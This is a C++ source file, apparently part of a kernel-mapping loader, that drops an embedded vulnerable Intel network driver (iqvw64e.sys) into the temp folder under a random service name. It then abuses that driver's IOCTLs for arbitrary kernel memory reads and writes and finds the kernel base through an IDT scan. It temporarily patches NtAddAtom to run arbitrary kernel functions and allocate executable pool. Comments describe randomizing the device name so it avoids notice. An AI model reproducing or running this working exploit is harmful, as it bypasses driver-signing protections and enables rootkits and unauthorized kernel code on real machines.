#include "nal.h"

#include "log.h"
#include "nt.h"
#include "service.h"

#include "res/iqvw_sys.h"
#include "km_shared_loader.h"

#include <cstdlib>
#include <cstring>
#include <ctime>

#include <intrin.h>
#include <fstream>
#include <vector>

namespace
{
    constexpr ULONG32 kIoctl = 0x80862007;
    constexpr DWORD   kServiceTypeKernel = 1;

    /*
     * NAL request blocks. Every case shares a 64-bit case number at offset 0
     * followed by a reserved slot; the remaining fields depend on the case.
     */
    typedef struct _COPY_MEMORY_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t source;
        uint64_t destination;
        uint64_t length;
    } COPY_MEMORY_BUFFER_INFO;

    typedef struct _FILL_MEMORY_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved1;
        uint32_t value;
        uint32_t reserved2;
        uint64_t destination;
        uint64_t length;
    } FILL_MEMORY_BUFFER_INFO;

    typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t return_physical_address;
        uint64_t address_to_translate;
    } GET_PHYS_ADDRESS_BUFFER_INFO;

    typedef struct _MAP_IO_SPACE_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t return_value;
        uint64_t return_virtual_address;
        uint64_t physical_address_to_map;
        uint32_t size;
    } MAP_IO_SPACE_BUFFER_INFO;

    typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved1;
        uint64_t reserved2;
        uint64_t virtual_address;
        uint32_t size;
    } UNMAP_IO_SPACE_BUFFER_INFO;

    typedef struct _READ_MEMORY_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t address;
        uint64_t buffer;
        uint64_t size;
    } READ_MEMORY_BUFFER_INFO;

    typedef struct _WRITE_MEMORY_BUFFER_INFO
    {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t address;
        uint64_t buffer;
        uint64_t size;
    } WRITE_MEMORY_BUFFER_INFO;

    std::wstring g_serviceName;
    std::wstring g_driverPath;
    std::wstring g_statePath;
    std::wstring g_deviceName;

    /* True only when this session registered the host service itself. */
    bool g_ownedService = false;

    std::wstring RandomServiceName()
    {
        static const char alphanum[] =
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        char buffer[32] = { 0 };

        srand((unsigned)time(nullptr) * GetCurrentThreadId());
        const int len = rand() % 12 + 12;

        for (int i = 0; i < len; ++i)
            buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

        return std::wstring(buffer, buffer + len);
    }

    /*
     * The device name is randomized separately from the service name. The service
     * is a registry key nobody enumerates casually; the device name sits in the
     * object namespace and is hashed into every IOCTL code, so it is the one that
     * has to stop looking like a project. Lowercase only, so it reads like an
     * ordinary vendor driver namespace rather than a build constant.
     */
    std::wstring RandomDeviceName()
    {
        static const char lower[] = "abcdefghijklmnopqrstuvwxyz";
        char buffer[16] = { 0 };

        srand((unsigned)time(nullptr) * GetCurrentThreadId() ^ GetTickCount());
        const int len = rand() % 5 + 8;

        for (int i = 0; i < len; ++i)
            buffer[i] = lower[rand() % (sizeof(lower) - 1)];

        return std::wstring(buffer, buffer + len);
    }

    bool Ioctl(const void* in, DWORD inSize, void* out, DWORD outSize, DWORD* returned)
    {
        if (nal::hDevice == INVALID_HANDLE_VALUE || !nal::hDevice)
            return false;

        DWORD bytes = 0;
        const BOOL ok = DeviceIoControl(nal::hDevice, kIoctl,
                                        const_cast<void*>(in), inSize,
                                        out, outSize, &bytes, nullptr);
        if (returned)
            *returned = bytes;
        return ok != FALSE;
    }
}

namespace nal
{
    HANDLE  hDevice = INVALID_HANDLE_VALUE;
    ULONG64 ntoskrnlBase = 0;

    /*
     * Third route, and the only one that does not depend on a masked API.
     *
     * On the target machine both SystemModuleInformation and EnumDeviceDrivers
     * report every kernel base as 0x0. The IDT is still a real kernel address, and
     * it lives inside ntoskrnl - so the image base is found by scanning outwards
     * from the IDT for an MZ/PE header. The scan is bounded and reads through the
     * driver, so unmapped pages simply fail and are skipped.
     */
    static uint64_t KernelBaseFromIdt()
    {
        struct { unsigned short limit; unsigned long long base; } idtr = { 0 };

        __sidt(&idtr);

        if (idtr.base < 0xFFFF800000000000ULL)
            return 0;

        km_log::Line("*", "idt base 0x%llX", idtr.base);

        const uint64_t anchor = idtr.base & ~0xFFFULL;
        uint8_t page[0x1000];

        for (int direction = 0; direction < 2; ++direction)
        {
            /* The IDT lives inside ntoskrnl and the image is at most ~16 MB, so
             * the base is BELOW it. Downward is the useful direction; upward is
             * only a shallow sanity sweep. Scanning 64 MB both ways costs ~65k
             * IOCTLs, which is seconds of stall for no benefit. */
            const uint64_t span = direction == 0 ? 0x1000000ULL : 0x100000ULL;

            for (uint64_t offset = 0; offset <= span; offset += 0x1000)
            {
                const uint64_t candidate = direction == 0 ? anchor - offset : anchor + offset;

                if (candidate < 0xFFFF800000000000ULL)
                    continue;

                if (!ReadMemory(candidate, page, sizeof(page)))
                    continue;

                if (page[0] != 'M' || page[1] != 'Z')
                    continue;

                const int32_t lfanew = *reinterpret_cast<int32_t*>(page + 0x3C);

                if (lfanew <= 0 || lfanew > 0x400)
                    continue;

                uint8_t pePage[0x200];

                if (!ReadMemory(candidate + (uint64_t)lfanew, pePage, sizeof(pePage)))
                    continue;

                if (pePage[0] != 'P' || pePage[1] != 'E' || pePage[2] != 0 || pePage[3] != 0)
                    continue;

                km_log::Step("kernel image found by IDT scan at 0x%llX",
                              (unsigned long long)candidate);
                return candidate;
            }
        }

        return 0;
    }

    /* Resolves the kernel base on demand, trying every route in cost order. */
    static bool EnsureKernelBase()
    {
        if (ntoskrnlBase)
            return true;

        ntoskrnlBase = nt::GetKernelBase();

        if (!ntoskrnlBase && hDevice != INVALID_HANDLE_VALUE)
            ntoskrnlBase = KernelBaseFromIdt();

        if (!ntoskrnlBase)
            km_log::Error("kernel base unresolved - export resolution is impossible");

        return ntoskrnlBase != 0;
    }

    void SetStatePath(const std::wstring& path)
    {
        g_statePath = path;
    }

    /* Empty until Load() or LoadState() has resolved one. */
    const std::wstring& DeviceName()
    {
        return g_deviceName;
    }

    const std::wstring& DriverPath()
    {
        return g_driverPath;
    }

    std::vector<std::wstring> DevicePaths()
    {
        std::vector<std::wstring> paths;

        if (!g_deviceName.empty())
        {
            paths.push_back(L"\\\\\\.\\" + g_deviceName);
            paths.push_back(L"\\\\?\\GLOBALROOT\\Device\\" + g_deviceName);
        }

        /*
         * A state file from an older build, or a driver started by hand, still
         * uses the historical namespace. Keep it as the last resort so an
         * existing mapping is never left unreachable.
         */
        paths.push_back(KM_WIN32_NAME);
        paths.push_back(L"\\\\?\\GLOBALROOT\\Device\\Kernmem");

        return paths;
    }

    unsigned long DeviceType()
    {
        return KmDeviceTypeFor(g_deviceName.c_str());
    }

    unsigned long RecodeIoctl(unsigned long code)
    {
        return KmRecodeIoctl(code, DeviceType());
    }

    uint64_t ResolveKernelBase()
    {
        if (ntoskrnlBase)
            return ntoskrnlBase;

        ntoskrnlBase = nt::GetKernelBase();

        if (!ntoskrnlBase && hDevice != INVALID_HANDLE_VALUE)
            ntoskrnlBase = KernelBaseFromIdt();

        return ntoskrnlBase;
    }

    /*
     * Service names and paths written to the state file are ASCII, so a direct
     * narrowing is safe - but building the string from wchar_t iterators is not,
     * because that assigns wide units into chars and warns. Narrow explicitly.
     */
    std::string Narrow(const std::wstring& text)
    {
        std::string out;
        out.reserve(text.size());

        for (wchar_t character : text)
            out.push_back(static_cast<char>(character & 0xFF));

        return out;
    }

    bool SaveState()
    {
        if (g_statePath.empty() || g_serviceName.empty())
            return false;

        std::ofstream out(g_statePath, std::ios::binary | std::ios::trunc);
        if (!out)
            return false;

        const std::string service = Narrow(g_serviceName);
        const std::string path = Narrow(g_driverPath);
        const std::string device = Narrow(g_deviceName);

        out << service << "\n" << path << "\n" << device << "\n";
        return out.good();
    }

    bool LoadState()
    {
        if (g_statePath.empty() || !g_serviceName.empty())
            return false;

        std::ifstream in(g_statePath, std::ios::binary);
        if (!in)
            return false;

        std::string service;
        std::string path;
        std::string device;
        std::getline(in, service);
        std::getline(in, path);
        std::getline(in, device);

        if (service.empty())
            return false;

        g_serviceName.assign(service.begin(), service.end());
        g_driverPath.assign(path.begin(), path.end());

        /* A state file from an older build has no third line. The device then
         * falls back to its static namespace, which still matches. */
        g_deviceName.assign(device.begin(), device.end());
        return true;
    }

    bool IsRunning()
    {
        const HANDLE probe = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (probe != INVALID_HANDLE_VALUE)
        {
            CloseHandle(probe);
            return true;
        }
        return false;
    }

    bool Attach()
    {
        LoadState();

        hDevice = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

        if (hDevice == INVALID_HANDLE_VALUE)
        {
            km_log::Error("mapping host is not running - nothing to attach to");
            return false;
        }

        if (!EnsureKernelBase())
        {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
            return false;
        }

        return true;
    }

    bool Load(const wchar_t* driverPath)
    {
        /*
         * A resident host is not a failure. After a crash the previous image can be
         * gone while \Device\Nal stays held, and refusing here meant only a reboot
         * could recover. Attach to what is already running instead.
         */
        if (IsRunning())
        {
            km_log::Warn("\\Device\\Nal is already resident - attaching to it");

            if (Attach())
            {
                /* Not ours: teardown must leave the service running. A state file
                 * naming a service means an earlier session of ours started it,
                 * and that one is ours to clean up. */
                g_ownedService = !g_serviceName.empty();
                return true;
            }

            km_log::Warn("attach failed - another NAL user holds it, reboot if it persists");
            return false;
        }

        g_serviceName = RandomServiceName();
        g_deviceName = RandomDeviceName();

        std::wstring temp = nt::GetFullTempPath();
        if (temp.empty())
        {
            km_log::Error("cannot resolve %%TEMP%%");
            return false;
        }

        g_driverPath = temp + L"\\" + g_serviceName + L".sys";

        if (!nt::CreateFileFromMemory(g_driverPath,
                                      reinterpret_cast<const char*>(iqvw64e_sys),
                                      iqvw64e_sys_size))
        {
            km_log::Error("cannot write the vulnerable driver to %ls", g_driverPath.c_str());
            return false;
        }

        km_log::Step("vulnerable driver dropped: %ls", g_driverPath.c_str());

        const NTSTATUS status = service::RegisterAndStart(g_driverPath, g_serviceName);

        if (NT_SUCCESS(status))
            g_ownedService = true;

        if (!NT_SUCCESS(status))
        {
            km_log::Error("service load failed (0x%08X)", status);
            _wremove(g_driverPath.c_str());
            return false;
        }

        hDevice = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDevice == INVALID_HANDLE_VALUE)
        {
            km_log::Error("\\Device\\Nal did not come up");
            service::StopAndRemove(g_serviceName);
            _wremove(g_driverPath.c_str());
            return false;
        }

        ntoskrnlBase = nt::GetKernelBase();

        /* Both module APIs report 0x0 here, so fall back to the IDT scan. */
        if (!ntoskrnlBase)
            ntoskrnlBase = KernelBaseFromIdt();

        if (!ntoskrnlBase)
        {
            /* Fatal, not a warning: with no kernel base there is no export
             * resolution, so mapping cannot proceed. Saying so here stops it
             * surfacing later as a bare "allocation failed". */
            km_log::Error("could not resolve the kernel image base");
            km_log::Info("both kernel-base routes failed - run `kernmem-loader.exe kbase` for detail");

            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
            service::StopAndRemove(g_serviceName);
            _wremove(g_driverPath.c_str());
            return false;
        }

        km_log::Step("kernel base resolved at 0x%llX", (unsigned long long)ntoskrnlBase);

        SaveState();
        return true;
    }

    bool Unload()
    {
        LoadState();

        if (hDevice != INVALID_HANDLE_VALUE && hDevice)
        {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
        }

        /*
         * Only release a host this session started. When \Device\Nal was already
         * resident we attached to a service somebody else registered - ours from
         * an earlier run, or another tool's - and stopping it would pull the
         * device out from under whatever still holds it. The dropped image is
         * kept too, because the registry ImagePath still points at it.
         */
        if (!g_ownedService)
        {
            if (!g_serviceName.empty())
                km_log::Info("mapping host left running - not started by this session");

            ntoskrnlBase = 0;
            return true;
        }

        if (!g_serviceName.empty())
        {
            service::StopAndRemove(g_serviceName);
            g_serviceName.clear();
        }
        else
        {
            /* Ours, but the state file is gone. Find the service by its display
             * name so \Device\Nal is released instead of staying held until a
             * reboot. */
            const int stopped = service::StopAllIqvw();

            if (stopped)
                km_log::Info("released %d stale mapping host service(s)", stopped);
        }

        if (!g_driverPath.empty())
        {
            _wremove(g_driverPath.c_str());
            g_driverPath.clear();
        }

        ntoskrnlBase = 0;
        return true;
    }

    bool MemCopy(uint64_t destination, uint64_t source, uint64_t size)
    {
        if (!destination || !source || !size)
            return false;

        COPY_MEMORY_BUFFER_INFO request = { 0 };
        request.case_number = 0x33;
        request.source = source;
        request.destination = destination;
        request.length = size;

        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
    }

    bool SetMemory(uint64_t address, uint32_t value, uint64_t size)
    {
        if (!address || !size)
            return false;

        FILL_MEMORY_BUFFER_INFO request = { 0 };
        request.case_number = 0x30;
        request.destination = address;
        request.value = value;
        request.length = size;

        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
    }

    bool ReadMemory(uint64_t address, void* buffer, uint64_t size)
    {
        if (!address || !buffer || !size)
            return false;

        READ_MEMORY_BUFFER_INFO request = { 0 };
        request.case_number = 0x31;
        request.address = address;
        request.buffer = reinterpret_cast<uint64_t>(buffer);
        request.size = size;

        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
    }

    bool WriteMemory(uint64_t address, void* buffer, uint64_t size)
    {
        if (!address || !buffer || !size)
            return false;

        WRITE_MEMORY_BUFFER_INFO request = { 0 };
        request.case_number = 0x37;
        request.address = address;
        request.buffer = reinterpret_cast<uint64_t>(buffer);
        request.size = size;

        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
    }

    bool GetPhysicalAddress(uint64_t address, uint64_t* outPhysical)
    {
        if (!address || !outPhysical)
            return false;

        GET_PHYS_ADDRESS_BUFFER_INFO request = { 0 };
        request.case_number = 0x25;
        request.address_to_translate = address;

        if (!Ioctl(&request, sizeof(request), nullptr, 0, nullptr))
            return false;

        *outPhysical = request.return_physical_address;
        return *outPhysical != 0;
    }

    uint64_t MapIoSpace(uint64_t physicalAddress, uint32_t size)
    {
        if (!physicalAddress || !size)
            return 0;

        MAP_IO_SPACE_BUFFER_INFO request = { 0 };
        request.case_number = 0x19;
        request.physical_address_to_map = physicalAddress;
        request.size = size;

        if (!Ioctl(&request, sizeof(request), nullptr, 0, nullptr))
            return 0;

        return request.return_virtual_address;
    }

    bool UnmapIoSpace(uint64_t address, uint32_t size)
    {
        if (!address || !size)
            return false;

        UNMAP_IO_SPACE_BUFFER_INFO request = { 0 };
        request.case_number = 0x1A;
        request.virtual_address = address;
        request.size = size;

        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
    }

    bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size)
    {
        auto source = static_cast<uint8_t*>(buffer);
        uint32_t done = 0;

        if (!address || !buffer || !size)
            return false;

        /*
         * The write is split at page boundaries.
         *
         * Translating only the FIRST byte and mapping `size` bytes from there
         * assumes the physical pages behind a virtual range are contiguous. They
         * are not. A 12-byte patch that crossed a 4 KB boundary therefore wrote its
         * tail into whatever physical memory happened to follow, corrupting a
         * foreign page - and that damage outlives the call and bugchecks later,
         * somewhere unrelated, which is exactly why it looked random.
         */
        while (done < size)
        {
            const uint64_t current = address + done;
            const uint32_t pageLeft = (uint32_t)(0x1000 - (current & 0xFFF));
            const uint32_t remaining = size - done;
            const uint32_t chunk = remaining < pageLeft ? remaining : pageLeft;

            uint64_t physical = 0;
            if (!GetPhysicalAddress(current, &physical))
                return false;

            const uint64_t mapped = MapIoSpace(physical, chunk);
            if (!mapped)
                return false;

            const bool ok = MemCopy(mapped, reinterpret_cast<uint64_t>(source + done), chunk);
            UnmapIoSpace(mapped, chunk);

            if (!ok)
                return false;

            done += chunk;
        }

        return true;
    }

    uint64_t GetKernelModuleBase(const char* moduleName)
    {
        return nt::GetKernelModuleAddress(moduleName);
    }

    uint64_t GetKernelModuleExport(uint64_t moduleBase, const std::string& functionName)
    {
        if (!moduleBase)
            return 0;

        IMAGE_DOS_HEADER dosHeader = { 0 };
        IMAGE_NT_HEADERS64 ntHeaders = { 0 };

        if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
            return 0;
        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
            return 0;

        if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)))
            return 0;
        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
            return 0;

        const IMAGE_DATA_DIRECTORY exportDirectory =
            ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (!exportDirectory.VirtualAddress || !exportDirectory.Size)
            return 0;

        IMAGE_EXPORT_DIRECTORY exports = { 0 };
        if (!ReadMemory(moduleBase + exportDirectory.VirtualAddress, &exports, sizeof(exports)))
            return 0;

        if (!exports.NumberOfNames)
            return 0;

        std::vector<uint32_t> nameTable(exports.NumberOfNames);
        if (!ReadMemory(moduleBase + exports.AddressOfNames, nameTable.data(),
                        nameTable.size() * sizeof(uint32_t)))
            return 0;

        for (uint32_t i = 0; i < exports.NumberOfNames; ++i)
        {
            char name[256] = { 0 };
            if (!ReadMemory(moduleBase + nameTable[i], name, sizeof(name) - 1))
                continue;

            if (functionName != name)
                continue;

            uint16_t ordinal = 0;
            if (!ReadMemory(moduleBase + exports.AddressOfNameOrdinals + i * sizeof(uint16_t),
                            &ordinal, sizeof(ordinal)))
                return 0;

            uint32_t functionRva = 0;
            if (!ReadMemory(moduleBase + exports.AddressOfFunctions + ordinal * sizeof(uint32_t),
                            &functionRva, sizeof(functionRva)))
                return 0;

            return moduleBase + functionRva;
        }

        return 0;
    }

    uint64_t AllocatePool(uint64_t size)
    {
        static uint64_t kernelExAllocatePool = 0;
        static uint64_t kernelExAllocatePoolWithTag = 0;
        uint64_t result = 0;

        /* NonPagedPool (0), not Nx: the mapped image is executed, so its pages
         * have to be executable. The third slot carries the pool tag. */
        const uint64_t args[4] = { 0, size, 0x42475662, 0 };

        if (!size || !EnsureKernelBase())
            return 0;

        /* A NonPagedPool request above PAGE_SIZE is refused on some builds, and
         * the image is 32 KB, so two allocators are tried before giving up. */
        if (!kernelExAllocatePool)
            kernelExAllocatePool = GetKernelModuleExport(ntoskrnlBase, "ExAllocatePool");

        if (kernelExAllocatePool &&
            CallKernelFunctionRaw(&result, kernelExAllocatePool, args, 2) && result)
            return result;

        if (!kernelExAllocatePoolWithTag)
            kernelExAllocatePoolWithTag = GetKernelModuleExport(ntoskrnlBase, "ExAllocatePoolWithTag");

        if (kernelExAllocatePoolWithTag &&
            CallKernelFunctionRaw(&result, kernelExAllocatePoolWithTag, args, 3) && result)
            return result;

        km_log::Error("both pool allocators failed for %llu bytes",
                       (unsigned long long)size);
        return 0;
    }

    bool FreePool(uint64_t address)
    {
        static uint64_t kernelExFreePool = 0;

        if (!address || !EnsureKernelBase())
            return false;

        if (!kernelExFreePool)
            kernelExFreePool = GetKernelModuleExport(ntoskrnlBase, "ExFreePool");

        if (!kernelExFreePool)
            return false;

        const uint64_t args[4] = { address, 0, 0, 0 };
        return CallKernelFunctionRaw(nullptr, kernelExFreePool, args, 1);
    }

    bool CallKernelFunctionRaw(void* outResult, uint64_t kernelFunction,
                               const uint64_t args[4], int argCount)
    {
        if (!kernelFunction)
            return false;

        const HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll)
            return false;

        const auto userNtAddAtom =
            reinterpret_cast<NTSTATUS(NTAPI*)(PVOID, ULONG, PVOID)>(
                GetProcAddress(ntdll, "NtAddAtom"));

        if (!userNtAddAtom)
            return false;

        /* mov rax, imm64 ; jmp rax */
        uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
        *reinterpret_cast<uint64_t*>(&stub[2]) = kernelFunction;

        static uint64_t kernelNtAddAtom = 0;

        if (!kernelNtAddAtom)
        {
            if (!EnsureKernelBase())
                return false;

            kernelNtAddAtom = GetKernelModuleExport(ntoskrnlBase, "NtAddAtom");
            if (!kernelNtAddAtom)
                return false;
        }

        /* A bad export walk can return a plausible-looking address from anywhere.
         * Patching outside ntoskrnl would corrupt an unrelated page, so the range
         * is checked before anything is written. */
        if (kernelNtAddAtom < ntoskrnlBase ||
            kernelNtAddAtom > ntoskrnlBase + 0x2000000ULL)
        {
            km_log::Error("NtAddAtom export 0x%llX is outside ntoskrnl - not patching",
                           (unsigned long long)kernelNtAddAtom);
            return false;
        }

        km_log::Step("patching NtAddAtom at 0x%llX (page offset 0x%llX)",
                      (unsigned long long)kernelNtAddAtom,
                      (unsigned long long)(kernelNtAddAtom & 0xFFF));

        uint8_t original[sizeof(stub)] = { 0 };
        if (!ReadMemory(kernelNtAddAtom, original, sizeof(original)))
            return false;

        if (!WriteToReadOnlyMemory(kernelNtAddAtom, stub, sizeof(stub)))
            return false;

        /* Confirm the patch actually landed; a silently failed write would send
         * the next call into garbage. */
        uint8_t verify[sizeof(stub)] = { 0 };
        if (!ReadMemory(kernelNtAddAtom, verify, sizeof(verify)) ||
            memcmp(verify, stub, sizeof(stub)) != 0)
        {
            WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original));
            km_log::Error("NtAddAtom patch did not take effect");
            return false;
        }

        /*
         * The syscall dispatch preserves rcx/rdx/r8/r9, so calling the user-mode
         * NtAddAtom lands on our patched kernel entry with the arguments intact.
         */
        using call4_t = uint64_t(NTAPI*)(uint64_t, uint64_t, uint64_t, uint64_t);
        const auto call = reinterpret_cast<call4_t>(userNtAddAtom);

        km_log::Step("entering kernel function 0x%llX with %d arg(s)",
                      (unsigned long long)kernelFunction, argCount);

        const uint64_t result = call(argCount > 0 ? args[0] : 0,
                                     argCount > 1 ? args[1] : 0,
                                     argCount > 2 ? args[2] : 0,
                                     argCount > 3 ? args[3] : 0);

        km_log::Step("kernel function returned 0x%llX", (unsigned long long)result);

        if (!WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original)))
            km_log::Error("NtAddAtom restore failed - the patch is still live");

        if (outResult)
            *reinterpret_cast<uint64_t*>(outResult) = result;

        return true;
    }
}
